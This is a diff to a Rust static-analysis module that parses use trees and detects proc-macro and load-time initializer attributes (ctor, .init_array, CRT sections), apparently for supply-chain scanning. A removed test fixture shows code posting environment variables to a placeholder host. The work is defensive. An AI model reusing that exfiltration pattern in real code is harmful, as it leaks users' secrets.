@@ -1,39 +1,23 @@
-//! Rust use trees and scoped call names, without compiler execution.
+//! Rust use trees, item attributes and scoped call names, without compiler
+//! execution.
+use super::text;
+use super::visit::{NodeIds, Visit};
 use crate::value_key;
 use crate::{Symbol, Symbols};
-use std::collections::HashMap;
+use std::collections::{HashMap, HashSet};
 use tree_sitter::Node;
 
-pub(super) fn imports(root: Node<'_>, source: &str) -> Vec<(String, u64)> {
-    let mut result = Vec::new();
-    let mut nodes = vec![root];
-    while let Some(node) = nodes.pop() {
-        if result.len() >= 10_000 {
-            break;
-        }
-        if node.kind() == "use_declaration" {
-            if let Some(arg) = node.child_by_field_name("argument") {
-                expand(arg, source, "", &mut result, 0);
-            }
-        } else {
-            let mut cursor = node.walk();
-            nodes.extend(node.named_children(&mut cursor));
-        }
-    }
-    result.sort_by_key(|(_, offset)| *offset);
-    result
-}
-
+/// Push every path the `use` tree `node` imports, under `prefix`.
 fn expand(node: Node<'_>, source: &str, prefix: &str, out: &mut Vec<(String, u64)>, depth: usize) {
-    if depth > 64 || out.len() >= 10_000 {
+    if depth > 64 || out.len() >= MAX_ITEMS {
         return;
     }
-    let text = |n: Node<'_>| n.utf8_text(source.as_bytes()).unwrap_or("").to_string();
+    let owned = |n: Node<'_>| text(n, source).to_string();
     match node.kind() {
         "scoped_use_list" => {
             let path = node
                 .child_by_field_name("path")
-                .map(text)
+                .map(owned)
                 .unwrap_or_default();
             let joined = join(prefix, &path);
             if let Some(list) = node.child_by_field_name("list") {
@@ -52,13 +36,13 @@ fn expand(node: Node<'_>, source: &str, prefix: &str, out: &mut Vec<(String, u64
                 node.child_by_field_name("alias"),
             ) {
                 out.push((
-                    format!("{} as {}", join(prefix, &text(path)), text(alias)),
+                    format!("{} as {}", join(prefix, &owned(path)), owned(alias)),
                     node.start_byte() as u64,
                 ));
             }
         }
         "identifier" | "scoped_identifier" | "self" | "use_wildcard" => {
-            out.push((join(prefix, &text(node)), node.start_byte() as u64));
+            out.push((join(prefix, &owned(node)), node.start_byte() as u64));
         }
         _ => {}
     }
@@ -74,94 +58,193 @@ fn join(prefix: &str, tail: &str) -> String {
     }
 }
 
+/// Collected items past which [`Items`] stops recording, and imports past
+/// which it stops expanding `use` trees.
+const MAX_ITEMS: usize = 10_000;
+
+/// What the shared walk ([`super::visit`]) collects from Rust source: `use`
+/// trees, out-of-line `mod` declarations, initializer and proc-macro
+/// attributes, and the test-only items every analysis skips.
+///
 /// Attribute and module facts are syntax-derived, never matched in comments
-/// or quoted examples. The consumer resolves modules against archive members.
-pub(super) fn execution_facts(root: Node<'_>, source: &str, values: &mut crate::Values) {
-    let mut modules = Vec::new();
-    let mut initializers = Vec::new();
-    let mut proc_macro = false;
-    let mut stack = vec![(root, String::new())];
-    while let Some((node, prefix)) = stack.pop() {
-        if modules.len() + initializers.len() > 10_000 {
-            break;
-        }
-        let mut attrs = Vec::new();
-        let mut previous = node.prev_named_sibling();
-        while let Some(attr) = previous.filter(|n| n.kind() == "attribute_item") {
-            attrs.push(
-                source[attr.byte_range()]
-                    .split_whitespace()
-                    .collect::<String>(),
-            );
-            previous = attr.prev_named_sibling();
-        }
-        if attrs.iter().any(|s| s == "#[cfg(test)]" || s == "#[test]") {
-            continue;
-        }
-        if node.kind() == "function_item" {
-            proc_macro |= attrs.iter().any(|s| {
-                s == "#[proc_macro]"
-                    || s == "#[proc_macro_attribute]"
-                    || s.starts_with("#[proc_macro_derive(")
+/// or quoted examples. Module paths are relative to the file; the consumer
+/// resolves them against sibling members.
+#[derive(Default)]
+pub(super) struct Items {
+    /// One per open node.
+    frames: Vec<ItemFrame>,
+    /// The module path below the open node, `a/b/` inside `mod a { mod b { … } }`.
+    path: String,
+    /// `use` paths in source order, `path as alias` when renamed.
+    pub(super) imports: Vec<(String, u64)>,
+    pub(super) imports_limited: bool,
+    /// Node ids of items gated by a `#[cfg(test)]` or `#[test]` attribute.
+    pub(super) test_only: HashSet<usize>,
+    modules: Vec<serde_json::Value>,
+    initializers: Vec<&'static str>,
+    proc_macro: bool,
+    limited: bool,
+}
+
+#[derive(Default)]
+struct ItemFrame {
+    /// The attributes of the run of `attribute_item`s among the named
+    /// children entered so far, whitespace removed; they apply to the next
+    /// named child.
+    attributes: Vec<String>,
+    /// Item facts are read below this node: it is not a function body, a
+    /// test-only item or a module declared out of line.
+    open: bool,
+    /// Length of [`Items::path`] to restore on exit, for a module with a body.
+    restore: Option<usize>,
+}
+
+impl Items {
+    pub(super) fn enter(&mut self, visit: &Visit<'_>, source: &str, ids: &NodeIds) {
+        let node = visit.node;
+        let Some(parent) = self.frames.last_mut() else {
+            self.frames.push(ItemFrame {
+                open: true,
+                ..ItemFrame::default()
             });
+            return;
+        };
+        if !visit.named {
+            self.frames.push(ItemFrame::default());
+            return;
         }
-        for attr in &attrs {
-            if attr.starts_with("#[ctor::ctor") || attr == "#[ctor]" {
-                initializers.push("ctor");
-            }
-            if attr.starts_with("#[link_section=") || attr.starts_with("#[unsafe(link_section=") {
-                if attr.contains("\".init_array\"") {
-                    initializers.push("elf-init-array");
-                }
-                if attr.contains("__mod_init_func") {
-                    initializers.push("macho-mod-init-func");
-                }
-                if attr.contains(".CRT$XCU") || attr.contains(".CRT$XCT") {
-                    initializers.push("pe-crt-initializer");
+        if ids.attribute_item.contains(visit.kind_id) {
+            parent
+                .attributes
+                .push(text(node, source).split_whitespace().collect());
+            self.frames.push(ItemFrame::default());
+            return;
+        }
+        // Anything else between an attribute and its item, a comment
+        // included, ends the run.
+        let attributes = std::mem::take(&mut parent.attributes);
+        let parent_open = parent.open;
+        let mut frame = ItemFrame {
+            open: parent_open,
+            ..ItemFrame::default()
+        };
+        if attributes
+            .iter()
+            .any(|a| a == "#[cfg(test)]" || a == "#[test]")
+        {
+            self.test_only.insert(node.id());
+            frame.open = false;
+        }
+        if ids.use_declaration.contains(visit.kind_id) {
+            if let Some(argument) = node.child_by_field_name("argument") {
+                expand(argument, source, "", &mut self.imports, 0);
+                if self.imports.len() >= MAX_ITEMS {
+                    self.imports_limited = true;
                 }
             }
         }
-        let mut nested_prefix = prefix.clone();
-        if node.kind() == "mod_item" {
-            if let Some(name) = node.child_by_field_name("name") {
-                let name = &source[name.byte_range()];
-                if node.child_by_field_name("body").is_none() {
-                    let override_path = attrs.iter().find_map(|s| {
-                        s.strip_prefix("#[path=\"")
+        if frame.open && !self.limited {
+            let kind = ids.rust_item.contains(visit.kind_id).then(|| node.kind());
+            self.item(node, kind, source, &attributes, &mut frame);
+        }
+        self.frames.push(frame);
+    }
+
+    /// Record the facts of an item reached through open items.
+    /// `kind` is the node's kind when it is a function or module.
+    fn item(
+        &mut self,
+        node: Node<'_>,
+        kind: Option<&str>,
+        source: &str,
+        attributes: &[String],
+        frame: &mut ItemFrame,
+    ) {
+        if self.modules.len() + self.initializers.len() > MAX_ITEMS {
+            tracing::debug!(
+                target: "filefacts::source",
+                format = "rust",
+                offset = node.start_byte(),
+                max = MAX_ITEMS,
+                "rust items: item budget exhausted; later modules and initializers omitted"
+            );
+            self.limited = true;
+            return;
+        }
+        for attribute in attributes {
+            if attribute.starts_with("#[ctor::ctor") || attribute == "#[ctor]" {
+                self.initializers.push("ctor");
+            }
+            if attribute.starts_with("#[link_section=")
+                || attribute.starts_with("#[unsafe(link_section=")
+            {
+                if attribute.contains("\".init_array\"") {
+                    self.initializers.push("elf-init-array");
+                }
+                if attribute.contains("__mod_init_func") {
+                    self.initializers.push("macho-mod-init-func");
+                }
+                if attribute.contains(".CRT$XCU") || attribute.contains(".CRT$XCT") {
+                    self.initializers.push("pe-crt-initializer");
+                }
+            }
+        }
+        match kind {
+            // Function-local module names cannot be resolved as crate siblings.
+            Some("function_item") => {
+                self.proc_macro |= attributes.iter().any(|a| {
+                    a == "#[proc_macro]"
+                        || a == "#[proc_macro_attribute]"
+                        || a.starts_with("#[proc_macro_derive(")
+                });
+                frame.open = false;
+            }
+            Some("mod_item") => {
+                let Some(name) = node.child_by_field_name("name") else {
+                    return;
+                };
+                let name = text(name, source);
+                if node.child_by_field_name("body").is_some() {
+                    frame.restore = Some(self.path.len());
+                    self.path.push_str(name);
+                    self.path.push('/');
+                } else {
+                    let path = attributes.iter().find_map(|a| {
+                        a.strip_prefix("#[path=\"")
                             .and_then(|p| p.strip_suffix("\"]"))
                     });
-                    modules.push(
-                        serde_json::json!({"name":name,"prefix":prefix,"path":override_path}),
-                    );
-                    continue;
+                    self.modules
+                        .push(serde_json::json!({"name": name, "prefix": self.path, "path": path}));
+                    frame.open = false;
                 }
-                nested_prefix = format!("{prefix}{name}/");
             }
+            _ => {}
         }
-        // Function-local module names cannot be resolved as crate siblings.
-        if node.kind() == "function_item" {
-            continue;
+    }
+
+    pub(super) fn exit(&mut self) {
+        if let Some(restore) = self.frames.pop().and_then(|frame| frame.restore) {
+            self.path.truncate(restore);
         }
-        let mut cursor = node.walk();
-        stack.extend(
-            node.named_children(&mut cursor)
-                .map(|n| (n, nested_prefix.clone())),
+    }
+
+    /// Write `source.rust.*`.
+    pub(super) fn emit(&mut self, values: &mut crate::Values) {
+        self.initializers.sort_unstable();
+        self.initializers.dedup();
+        values.insert_key(
+            value_key!("source.rust.modules"),
+            serde_json::json!(self.modules),
+        );
+        values.insert_key(
+            value_key!("source.rust.proc_macro"),
+            serde_json::json!(self.proc_macro),
+        );
+        values.insert_key(
+            value_key!("source.rust.initializers"),
+            serde_json::json!(self.initializers),
         );
     }
-    initializers.sort_unstable();
-    initializers.dedup();
-    values.insert_key(
-        value_key!("source.rust.modules"),
-        serde_json::json!(modules),
-    );
-    values.insert_key(
-        value_key!("source.rust.proc_macro"),
-        serde_json::json!(proc_macro),
-    );
-    values.insert_key(
-        value_key!("source.rust.initializers"),
-        serde_json::json!(initializers),
-    );
 }
 
 pub(super) fn resolve_calls(symbols: &mut Symbols) {
@@ -193,50 +276,4 @@ pub(super) fn resolve_calls(symbols: &mut Symbols) {
 }
 
 #[cfg(test)]
-mod tests {
-    use crate::{OpenOptions, Symbol};
-    use std::path::Path;
-    #[test]
-    fn rust_grouped_aliases_scoped_calls_and_let_binds() {
-        let parsed=OpenOptions::new().path(Path::new("lib.rs")).open(br#"
-use std::{env::{vars as environment}, fs};
-use reqwest::blocking::Client;
-fn run() { let data=environment(); let client=Client::new(); client.post("https://example.invalid").json(&data).send(); }
-"#);
-        let imports = parsed
-            .symbols()
-            .iter()
-            .filter_map(|s| {
-                if let Symbol::Import { name, alias, .. } = s {
-                    Some((name.as_str(), alias.as_deref()))
-                } else {
-                    None
-                }
-            })
-            .collect::<Vec<_>>();
-        assert!(
-            imports.contains(&("std::env::vars", Some("environment"))),
-            "{imports:?}"
-        );
-        assert!(imports.contains(&("std::fs", None)), "{imports:?}");
-        assert!(
-            imports.contains(&("reqwest::blocking::Client", None)),
-            "{imports:?}"
-        );
-        assert!(
-            parsed
-                .symbols()
-                .iter()
-                .any(|s| matches!(s,Symbol::Call{target:Some(n),..} if n=="std::env::vars"))
-        );
-        assert!(parsed.symbols().iter().any(
-            |s| matches!(s,Symbol::Call{target:Some(n),..} if n=="reqwest::blocking::Client::new")
-        ));
-        assert!(
-            parsed
-                .symbols()
-                .iter()
-                .any(|s| matches!(s,Symbol::Bind{target,..} if target=="data"))
-        );
-    }
-}
+mod tests;
